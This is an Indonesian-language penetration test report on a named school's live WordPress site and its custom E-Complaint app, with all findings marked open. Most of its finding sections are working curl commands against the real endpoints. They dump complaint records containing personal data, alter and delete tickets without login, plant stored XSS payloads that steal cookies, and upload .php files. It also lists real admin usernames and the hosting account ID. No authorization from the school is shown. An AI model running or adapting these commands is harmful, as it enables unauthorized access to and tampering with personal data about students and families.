# REPORT-1 — Web Application Penetration Test

## Target: https://smpm12gkb.sch.id/ (SMP Muhammadiyah 12 GKB Gresik)

| Field | Value |
|---|---|
| **Tanggal pengujian** | 13 Oktober 2026, 21:57–23:00 UTC |
| **Tester** | petangZi |
| **Metode** | Black-box, unauthenticated, non-destruktif (PoC bukti, tanpa merusak data produksi) |
| **Scope utama** | https://smpm12gkb.sch.id/ — fokus aplikasi custom `/app/page/` (E-Complaint, AISA Chat) + fingerprint WordPress core/plugin + CVE matching |
| **Status laporan** | OPEN — sebagian temuan sudah dimitigasi di tengah pengujian (lihat Timeline) |
| **Repo bukti** | https://github.com/petangZi/Smpm12gkb.sch.id-cve |

---

## 1. Ringkasan Eksekutif

| ID | Temuan | Severity | Endpoint terdampak | Status |
|---|---|---|---|---|
| **F1** | Broken Access Control — seluruh API admin E-Complaint tanpa autentikasi (dump massal, ubah status, hapus tiket) | **CRITICAL** | https://smpm12gkb.sch.id/app/page/E-Complaint/api.php | **OPEN** (guard parsial dipasang di tengah tes; API tidak ikut ditutup) |
| **F2** | Stored XSS via form pengaduan → eksekusi di panel admin (same-origin dengan WordPress) | **HIGH** | https://smpm12gkb.sch.id/app/page/E-Complaint/ | OPEN |
| **F3** | Unrestricted file upload — ekstensi `.php` dipertahankan server-side | **HIGH** | https://smpm12gkb.sch.id/app/page/E-Complaint/api.php | OPEN |
| **F4** | Kebocoran PII — pencarian tiket via email/No HP mengembalikan data komplain lengkap tanpa verifikasi | **MEDIUM** | https://smpm12gkb.sch.id/app/page/E-Complaint/api.php | OPEN |
| **F5** | Enumerasi user WordPress + XML-RPC aktif (amplifikasi brute-force) | **MEDIUM** | https://smpm12gkb.sch.id/?rest_route=/wp/v2/users & https://smpm12gkb.sch.id/xmlrpc.php | OPEN |
| **F6** | Path disclosure + `display_errors=On` | **LOW** | https://smpm12gkb.sch.id/app/page/E-Complaint/api.php | OPEN |
| **F7** | Temuan minor lain (wp-cron terbuka, `dalas/v1` unauth, sanitasi chat lemah, permukaan subdomain) | **LOW/INFO** | (lihat F7) | OPEN |

**Catatan CVE:** Seluruh komponen WordPress (core 7.1.3 + plugin) berada di versi terbaru dan **tidak ada CVE publik yang exploitable**. Vulnerabilitas nyata berada di **kode aplikasi custom PHP** di dalam direktori `/app/` yang berjalan dengan origin yang sama dengan WordPress.

---

## 2. Timeline Pengujian

- **13 Okt 2026 ~21:57 UTC** — Recon dimulai (fingerprint stack, WordPress enumeration).
- **~22:10 UTC** — `admin.php` dapat diakses tanpa autentikasi (HTTP 200, 17.193 byte, panel admin penuh ter-render). Source panel di-capture.
- **~22:14–22:44 UTC** — PoC F1–F4 dijalankan (tiket uji dibuat, sumber: tester). 
- **~22:45 UTC** — Perubahan di sisi target terdeteksi: `admin.php` kini balas **HTTP 302** → `https://smpm12gkb.sch.id/app/guard.php?redirect=/app/page/E-Complaint/admin.php` (halaman login "Master Guard"). Sejumlah tiket lama juga terhapus dari database (26 → 9 record).
- **~22:52 UTC** — Verifikasi ulang: **API `api.php` TETAP TERBUKA tanpa autentikasi** setelah guard dipasang. `admin_get_all`, `admin_update_status`, `admin_delete` masih dieksekusi (bukti live di evidence `poc-misc.txt`).
- **~23:00 UTC** — Cleanup: seluruh tiket uji milik tester dihapus. Data milik pengguna lain tidak disentuh.

---

## 3. Stack Teridentifikasi

| Komponen | Versi | Sumber deteksi |
|---|---|---|
| CMS | **WordPress 7.1.3** (rilis 6 Okt 2026 — terbaru saat tes) | feed generator |
| Page Builder | **Elementor 4.3.5** | meta generator |
| Plugin | LiteSpeed Cache 7.9.1, Forminator 1.58.0, File Manager Advanced 5.4.14, Template Kit Import 1.0.17, Site Kit by Google 1.189.0, Yoast SEO 28.7, OptinMonster 2.17.1, Site Mailer 1.4.7, YouTube Embed Plus 14.2.6.1, Akismet, WPMU DEV Hub Connector, MonsterInsights | `readme.txt` per plugin + REST API namespaces |
| Theme | Astra | markup |
| Hosting | Hostinger (LiteSpeed + hcdn), akun `u576897008` | header + warning leak |
| Aplikasi custom | `/app/page/AISA Chat/` (chatbot AI, `chat.php`), `/app/page/E-Complaint/` (sistem tiket pengaduan, `api.php` + `admin.php` + `guard.php`) | struktur direktori |
| Subdomain | `virtualclass.smpm12gkb.sch.id` (Moodle, PHP 8.2.34), `tamanilmu.smpm12gkb.sch.id` (SLiMS/Senayan, PHP 8.3.35), `synology.smpm12gkb.sch.id` (Synology NAS via QuickConnect), `smpm12gkb.sidikmu.com` | banner grab |

---

## 4. CVE Matching — Hasil: Semua Patched

| Komponen | Versi target | CVE relevan | Fixed in | Status |
|---|---|---|---|---|
| WordPress core | 7.1.3 | CVE-2026-93485 (unauth stored XSS, ≤7.1) | 7.1.1 | ✅ PATCHED |
| WordPress core | 7.1.3 | CVE-2026-87902 (path traversal → RCE, pre-7.1.2) | 7.1.2 | ✅ PATCHED |
| Advanced File Manager | 5.4.14 | CVE-2026-11565 (<5.4.13, auth file read/write) | 5.4.13 | ✅ PATCHED |
| Advanced File Manager | 5.4.14 | CVE-2024-11391 (≤5.2.10, arbitrary file upload), CVE-2024-8126 (≤5.2.8), CVE-2024-5598 (≤5.2.4), CVE-2023-3814 (<5.1.1), CVE-2024-13805 (≤5.2.14) | ≤5.2.14 | ✅ PATCHED |
| Template Kit Import | 1.0.17 | CVE-2026-96824 (≤1.0.16, arbitrary file deletion) | 1.0.17 | ✅ PATCHED |
| Template Kit Import | 1.0.17 | CVE-2024-2334 (≤1.0.14) | 1.0.15 | ✅ PATCHED |
| LiteSpeed Cache | 7.9.1 | CVE-2026-84761 (≤7.9, unauth SSRF), CVE-2026-76579 (≤7.9, unauth XSS via ESI) | 7.9.1 | ✅ PATCHED |
| Forminator | 1.58.0 | CVE-2026-6214 (≤1.53.0, missing authorization/scheduled export) | 1.53.1 | ✅ PATCHED |
| Elementor | 4.3.5 | CVE-2026-8825 (<4.1.4, private post disclosure), CVE-2026-57619 (≤4.1.3) | 4.1.4 | ✅ PATCHED |

**Kesimpulan CVE:** Tidak ada CVE publik yang exploitable pada stack WordPress. Attack surface riil = aplikasi custom E-Complaint & AISA Chat (F1–F4).

---

## 5. Detail Temuan

### F1 — CRITICAL: Broken Access Control — API admin E-Complaint tanpa autentikasi

**Endpoint:**
- https://smpm12gkb.sch.id/app/page/E-Complaint/admin.php (UI panel admin)
- https://smpm12gkb.sch.id/app/page/E-Complaint/api.php?action=admin_get_all (dump seluruh database tiket)
- https://smpm12gkb.sch.id/app/page/E-Complaint/api.php dengan `action=admin_update_status` (ubah status/tindak lanjut tiket siapa pun)
- https://smpm12gkb.sch.id/app/page/E-Complaint/api.php dengan `action=admin_delete` (hapus tiket siapa pun)

**Deskripsi:** Seluruh fungsi administratif sistem E-Complaint dieksekusi tanpa session, tanpa token, tanpa capability check apa pun. Pada awal tes `admin.php` bahkan ter-render penuh tanpa login (HTTP 200, 17.193 byte; capture tersimpan di `evidence/poc-admin-page.txt`). Pukul ~22:45 UTC target memasang `guard.php` (password form) untuk `admin.php`, namun **API tidak ikut dilindungi** — diverifikasi live setelah guard aktif.

**PoC 1 — Dump seluruh database tiket (unauthenticated):**

```bash
curl -s "https://smpm12gkb.sch.id/app/page/E-Complaint/api.php?action=admin_get_all"
```

Respons (HTTP 200, 9 record saat capture ~22:52 UTC; PII di-redact — versi struktur lengkap ada di `evidence/poc-admin-get-all.redacted.json`):

```json
{"status":"success","data":[
  {"tid":"52","no_tiket":"[REDACTED]","tgl":"2026-09-15 09:52:57",
   "nama":"[REDACTED]","telp":"[REDACTED]","email":"[REDACTED]",
   "jenis":"Siswa","lingkup":"Kesiswaan","keluhan":"[REDACTED]",
   "pendukung":"complaint_[REDACTED].php","status":"Menunggu"},
  {"tid":"49","no_tiket":"[REDACTED]","tgl":"[REDACTED]",
   "nama":"[REDACTED]","telp":"[REDACTED]","email":"[REDACTED]",
   "jenis":"[REDACTED]","lingkup":"[REDACTED]","keluhan":"[REDACTED]",
   "pendukung":"","status":"Menunggu"}
]}
```

> Snapshot pertama (~22:20 UTC) mengembalikan **26 record** termasuk nama, nomor HP, alamat email, dan isi keluhan warga sekolah. Field `pendukung` pada beberapa record berisi lampiran `.php` yang diupload pengguna lain (mis. `complaint_EC-REDACTED_*.php`).

**PoC 2 — Ubah status tiket tanpa login (write):**

```bash
curl -s -X POST "https://smpm12gkb.sch.id/app/page/E-Complaint/api.php" \
  -d "action=admin_update_status&tid=70&status=Selesai&tindak_lanjut=Dioverwrite oleh pentest tanpa login"
# → {"status":"success"}
```

Verifikasi perubahan via endpoint publik:

```bash
curl -s "https://smpm12gkb.sch.id/app/page/E-Complaint/api.php?action=get_status&ticket_id=EC-18432213102026"
# → "status":"Selesai","tindak_lanjut":"Dioverwrite oleh pentest tanpa login"
```

**PoC 3 — Hapus tiket tanpa login (delete):**

```bash
curl -s -X POST "https://smpm12gkb.sch.id/app/page/E-Complaint/api.php" \
  -d "action=admin_delete&tid=99999"
# → {"status":"success"}   (tid fiktif — membuktikan eksekusi tanpa auth; tanpa menghapus data nyata)
```

**Dampak:** Siapa pun di internet dapat: (a) mengunduh seluruh database pengaduan beserta PII warga sekolah (nama, telepon, email, isi keluhan, lampiran); (b) memanipulasi status tiket (menghilangkan jejak pengaduan); (c) menghapus tiket apa pun. CWE-862 (Missing Authorization), estimasi CVSS 3.1: **9.8 (Critical)** — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`.

**Bukti mentah:** `evidence/poc-admin-api.txt`, `evidence/poc-admin-get-all.redacted.json`, `evidence/poc-admin-page.txt`, `evidence/poc-misc.txt`.

**Rekomendasi:**
1. Wajibkan autentikasi session + role check di setiap action `admin_*` pada `api.php` — bukan hanya guard di `admin.php`.
2. Jangan mengandalkan kerahasiaan URL/action sebagai kontrol akses.
3. Terapkan rate-limiting + logging pada endpoint API.

---

### F2 — HIGH: Stored XSS via form pengaduan → panel admin (same-origin WordPress)

**Deskripsi:** Field `nama` dan `keluhan` disimpan mentah di database, lalu dirender via `innerHTML` tanpa escaping di halaman publik dan panel admin. Payload yang dikirim melalui form pengaduan akan **eksekusi JavaScript di browser admin** saat admin membuka panel.

**PoC — Submit payload:**

```bash
curl -s -X POST "https://smpm12gkb.sch.id/app/page/E-Complaint/api.php" \
  -F "action=submit_complaint" \
  -F 'nama=Pentest PoC <img src=x onerror=alert(document.domain)>' \
  -F "telp=+62812345678" \
  -F "email=poc@example.com" \
  -F "jenis=Masyarakat Umum" \
  -F "lingkup=Administrasi / Keuangan" \
  -F 'keluhan=POC REPORT-1 stored XSS marker <img src=x onerror=alert(document.cookie)> end marker' \
  -F "terms=on"
# → {"status":"success","ticket_id":"EC-18432213102026"}
```

**Bukti payload tersimpan mentah (response `get_status`):**

```bash
curl -s "https://smpm12gkb.sch.id/app/page/E-Complaint/api.php?action=get_status&ticket_id=EC-18432213102026"
```

```json
{"status":"success","data":{"tid":70,"no_tiket":"EC-18432213102026",
 "nama":"Pentest PoC <img src=x onerror=alert(document.domain)>",
 "keluhan":"POC REPORT-1 stored XSS marker <img src=x onerror=alert(document.cookie)> end marker",
 "status":"Menunggu"}}
```

**Sink XSS (source ter-render, capture `admin.php` saat masih 200):**

```javascript
// admin.php — renderTable(), baris 299 dan 304 (capture 13 Okt ~22:10 UTC)
tr.innerHTML = `
    <td>${item.tgl}</td>
    ...
    <td style="max-width:300px; word-wrap:break-word; white-space:pre-wrap;">
        ${item.keluhan}      // ← sink: rendered tanpa escaping
    </td>
    ...`;
```

Sink tambahan di halaman publik `ecomplaint.html` — baris 719/723 (history render) dan 807/811 (hasil pencarian):

```javascript
div.innerHTML = `
    ...
    <span style="display:block; margin-top:5px; font-size:14px;">${item.nama}</span>  // ← sink
    ...`;
```

**Dampak:** Karena panel E-Complaint berjalan di origin yang sama dengan WordPress (`smpm12gkb.sch.id`), JavaScript yang tereksekusi di panel admin dapat melakukan request same-origin ke `/wp-admin/` menggunakan cookie session admin yang sedang aktif → eskalasi menuju **kompromi penuh WordPress** (pembuatan admin baru, pencurian session, defacement). CWE-79.

**Rekomendasi:**
1. Escape semua output: PHP `htmlspecialchars($value, ENT_QUOTES, 'UTF-8')`; JS ganti render `innerHTML` dengan `textContent` / DOM API aman, atau sanitasi dengan DOMPurify.
2. Validasi input server-side (whitelist karakter untuk `nama`).
3. Pasang header `Content-Security-Policy` yang membatasi inline script.

---

### F3 — HIGH: Unrestricted file upload — ekstensi `.php` dipertahankan

**Deskripsi:** Field lampiran `pendukung` pada form pengaduan tidak divalidasi server-side. File `.php` diterima dan disimpan dengan ekstensi asli dipertahankan. `accept="image/*"` hanya berlaku client-side.

**PoC:**

```bash
printf '<?php echo "POC_".PHP_VERSION;' > poc-upload.php
curl -s -X POST "https://smpm12gkb.sch.id/app/page/E-Complaint/api.php" \
  -F "action=submit_complaint" \
  -F "nama=Upload PoC Report1" \
  -F "telp=+62812345678" \
  -F "email=poc2@example.com" \
  -F "jenis=Masyarakat Umum" \
  -F "lingkup=Sarana Prasarana" \
  -F "keluhan=Uji validasi ekstensi upload untuk REPORT-1." \
  -F "terms=on" \
  -F "pendukung=@poc-upload.php;type=application/x-php"
# → {"status":"success","ticket_id":"EC-39432213102026"}
```

**Bukti file tersimpan dengan ekstensi `.php` (response `get_status`):**

```bash
curl -s "https://smpm12gkb.sch.id/app/page/E-Complaint/api.php?action=get_status&ticket_id=EC-39432213102026"
```

```json
{"status":"success","data":{"tid":71,"no_tiket":"EC-39432213102026",
 "pendukung":"complaint_EC-39432213102026_1791931419.php","status":"Menunggu"}}
```

**Catatan dampak:** Path penyimpanan belum berhasil dilokalisasi pada pengujian ini (kandidat umum seperti `/app/page/E-Complaint/uploads/` mengembalikan 404/403), sehingga eksekusi remote belum terkonfirmasi. Namun validasi ekstensi nol + lampiran `.php` milik pengguna lain yang ada di database (snapshot awal: tid 66 & 67) menjadikan ini risiko tinggi: jika folder penyimpanan pernah terekspos langsung (miskonfigurasi web server, backup, atau path traversal lain), dampaknya menjadi **unauthenticated RCE**. CWE-434.

**Rekomendasi:**
1. Whitelist ekstensi + MIME type server-side (mis. hanya jpg/png/pdf).
2. Rename file random tanpa ekstensi asli; simpan **di luar webroot**.
3. Larang eksekusi PHP di folder upload (`.htaccess`: `php_flag engine off` / konfigurasi LiteSpeed setara).
4. Serve lampiran via script dengan `Content-Type: application/octet-stream` + `Content-Disposition: attachment`.

---

### F4 — MEDIUM: Kebocoran PII via pencarian tiket

**Deskripsi:** `action=search_status` mengembalikan data komplain lengkap hanya dengan mengetahui email atau nomor HP target — tanpa verifikasi kepemilikan.

**PoC:**

```bash
curl -s -X POST "https://smpm12gkb.sch.id/app/page/E-Complaint/api.php" \
  -d "action=search_status&keyword=poc@example.com"
```

```json
{"status":"success","data":[{"no_tiket":"EC-18432213102026",
 "nama":"Pentest PoC <img src=x onerror=alert(document.domain)>",
 "tgl":"2026-10-13 22:43:18","status":"Menunggu",
 "keluhan":"POC REPORT-1 stored XSS marker <img src=x onerror=alert(document.cookie)> end marker"}]}
```

**Dampak:** Siapa pun yang mengetahui email/No HP seseorang (mudah untuk warga sekolah) dapat membaca isi pengaduan orang tersebut. CWE-200/CWE-639.

**Rekomendasi:** Hapus pencarian by email/HP; jika diperlukan, wajibkan verifikasi (kode OTP ke email/HP terdaftar) atau minimal No Tiket + CAPTCHA + rate limit.

---

### F5 — MEDIUM: Enumerasi user WordPress + XML-RPC aktif

**PoC 1 — Enumerasi user via REST API (unauthenticated):**

```bash
curl -s "https://smpm12gkb.sch.id/?rest_route=/wp/v2/users"
# → "id":13,"slug":"alfarobi"  |  "id":9,"slug":"akailham"
```

**PoC 2 — XML-RPC aktif dengan `system.multicall`:**

```bash
curl -s -X POST "https://smpm12gkb.sch.id/xmlrpc.php" \
  -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'
# → system.multicall, pingback.ping, demo.sayHello, dll.
```

**Dampak:** Username admin terekspos + `system.multicall` memungkinkan ratusan percobaan password per request (amplifikasi brute-force) + `pingback.ping` sebagai probe SSRF. CWE-200.

**Rekomendasi:** Nonaktifkan XML-RPC (kecuali dibutuhkan), blokir enumerasi `/wp/v2/users`, pasang limit login attempt + 2FA untuk akun admin.

---

### F6 — LOW: Path disclosure + `display_errors=On`

**PoC:**

```bash
curl -s -X POST "https://smpm12gkb.sch.id/app/page/E-Complaint/api.php" \
  -F "action=submit_complaint" -F "nama=Warning Test" -F "telp=+62" \
  -F "email=w@example.com" -F "keluhan=trigger warning" -F "terms=on"
```

```html
<b>Warning</b>:  Undefined array key "jenis" in
<b>/home/u576897008/domains/smpm12gkb.sch.id/public_html/app/page/E-Complaint/api.php</b> on line <b>12</b>
```

**Dampak:** Struktur filesystem server + username hosting (`u576897008`) terbocor. CWE-209.

**Rekomendasi:** `display_errors=Off` pada php.ini produksi; validasi field wajib dengan pesan generik.

---

### F7 — LOW/INFO: Temuan minor

| Item | Bukti | Catatan |
|---|---|---|
| `wp-cron.php` publik | `GET https://smpm12gkb.sch.id/wp-cron.php → 200` | Vector DoS kecil; pindahkan ke cron sistem (`DISABLE_WP_CRON`). |
| `dalas/v1/stats` unauth read | `GET https://smpm12gkb.sch.id/wp-json/dalas/v1/stats?id=5 → {"views":"1",...}` | Counter publik; minor. |
| Sanitasi AISA Chat lemah | `appendSpdMessage()` memakai `innerHTML` dengan hanya strip tag `<script>` | Saat ini bot menolak echo payload; risiko laten bila logika berubah. Ganti ke `textContent`. |
| Subdomain surface | `virtualclass.` = Moodle (PHP 8.2.34); `tamanilmu.` = SLiMS; `synology.` = Synology NAS via QuickConnect | Di luar scope utama; wajib diaudit terpisah — versi Moodle/SLiMS/DSM tidak terverifikasi dari sini. |
| MCP endpoint | `GET https://smpm12gkb.sch.id/wp-json/mcp/mcp-adapter-default-server → 401` | Terproteksi — OK, catat sebagai surface. |

---

## 6. Hasil Negatif (yang sudah diuji, tidak tembus)

- **SQL Injection:** `dalas/v1/stats` (payload `'`, `1' OR '1'='1`, `1 AND SLEEP(3)`, `UNION SELECT` → respons konsisten cepat, tidak ada error SQL), `search_status` (quote/boolean/time-based → tidak tembus), `get_status` (parameterized). **Tidak ditemukan SQLi.**
- **RCE:** Tidak terkonfirmasi — lihat catatan F3 (upload `.php` diterima tapi path penyimpanan belum terlokalisasi).
- **CVE core/plugin:** Tidak ada yang exploitable (lihat bagian 4).
- **XSS di core WordPress:** Semua fix 7.1.3 sudah terpasang.

---

## 7. Rekomendasi Prioritas (urut)

1. **F1 (CRITICAL):** Auth + role check di `api.php` untuk semua action `admin_*`. Guard `guard.php` saat ini hanya menutup `admin.php`, bukan API-nya.
2. **F2 (HIGH):** Escaping output di seluruh render (`admin.php`, `ecomplaint.html`, `aisa.js`) — `htmlspecialchars` / `textContent` / DOMPurify + CSP.
3. **F3 (HIGH):** Validasi upload server-side, rename, simpan di luar webroot, matikan eksekusi PHP di folder upload.
4. **F4 (MEDIUM):** Amankan `search_status` (verifikasi kepemilikan / No Tiket + rate limit).
5. **F5 (MEDIUM):** Matikan XML-RPC, blokir enumerasi user, limit login + 2FA.
6. **F6 (LOW):** `display_errors=Off`.
7. **F7 (LOW/INFO):** `DISABLE_WP_CRON`, audit subdomain (Moodle/SLiMS/Synology DSM), hardening sanitasi chat.

---

## 8. Catatan Metodologi & Cleanup

- Pengujian dilakukan **tanpa autentikasi** dan **tanpa merusak data**: tidak ada payload destruktif, tidak ada data pengguna lain yang diubah/dihapus.
- Tiket uji yang dibuat selama pembuktian: `EC-50142213102026` (tid 68), `EC-35172213102026` (tid 69), `EC-18432213102026` (tid 70), `EC-39432213102026` (tid 71), `EC-46432213102026` (tid 72) — **seluruhnya dihapus** setelah bukti terekam (poc-admin-api.txt).
- PII milik warga sekolah yang terekspos selama pengujian **di-redact** di seluruh file repository ini.
- Seluruh bukti mentah tersedia di direktori [`evidence/`](./evidence/).

## 9. Indeks Bukti

| File | Isi |
|---|---|
| [`evidence/poc-admin-api.txt`](./evidence/poc-admin-api.txt) | PoC F1: `admin_update_status` + verifikasi + `admin_delete` + cleanup |
| [`evidence/poc-admin-get-all.redacted.json`](./evidence/poc-admin-get-all.redacted.json) | PoC F1: dump `admin_get_all` (PII redacted) |
| [`evidence/poc-admin-page.txt`](./evidence/poc-admin-page.txt) | F1: status `admin.php` (200 → 302 guard) + sink XSS |
| [`evidence/poc-stored-xss.txt`](./evidence/poc-stored-xss.txt) | PoC F2: submit payload, raw reflection, PII search |
| [`evidence/poc-upload.txt`](./evidence/poc-upload.txt) | PoC F3: upload `.php` + filename tersimpan |
| [`evidence/poc-pathdisclosure.txt`](./evidence/poc-pathdisclosure.txt) | PoC F6: warning path lengkap |
| [`evidence/poc-wp-enum.txt`](./evidence/poc-wp-enum.txt) | PoC F5: user enum + XML-RPC methods |
| [`evidence/poc-misc.txt`](./evidence/poc-misc.txt) | F7: wp-cron, dalas stats, mcp, subdomain fingerprint |
| [`poc/poc-ecomplaint.sh`](./poc/poc-ecomplaint.sh) | Script PoC runnable (all findings) |

---

*Report-1 — 13 Oktober 2026. Report selanjutnya akan menyusul bila ada temuan tambahan (report-2, dst).*
